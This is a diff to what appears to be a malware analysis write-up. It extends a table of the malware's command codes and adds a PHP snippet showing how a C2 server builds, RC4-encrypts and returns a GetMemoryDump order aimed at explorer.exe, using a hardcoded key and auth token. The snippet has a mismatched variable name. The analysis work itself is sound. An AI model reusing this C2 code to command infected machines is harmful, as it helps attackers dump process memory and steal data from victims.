@@ -36,7 +36,7 @@ This detailed analysis will be split into several parts, I will be presenting in
 
 # COMMAND LIST
 
-Here is a short description of the command codes and purpose :  
+Here is a short description of the first 20 command codes and purpose :  
 
 | Command ID   | Description             | Parameter     |
 | :----------- | :---------------------- | :------------:|
@@ -61,5 +61,30 @@ Here is a short description of the command codes and purpose :
 | "\x9a\xbe"   | QuerySessionInformation | NA            | 
 | "\xb7\x38"   | GetDnsCacheDataTable    | NA            |
 
+On the C2 side, a command can be issued this way (example with the GetMemoryDump order) :  
 
+```php
+$RC4Key = "S47EFEUO3D2O6641";
+$auth_token = "OV1T557KBIUECUM5";
+
+function GetMemoryDump($process_name)
+{
+	$cmd_id = "\x34\x49 $process_name";
+	$cmd_id_b64 = base64_encode($cmd_id);
+	
+	return $cmd_id_b64;
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST')
+{
+	$cmd_id_b64 = GetMemoryDump("explorer.exe");
+	
+	$cmd = "$auth_token, $cmd_id_b64";
+	$cmd_enc = rc4($Rc4Key, $cmd);
+	$cmd_b64 = base64_encode($cmd_enc);
+	echo $cmd_b64;
+	
+	return;
+}
+```
 
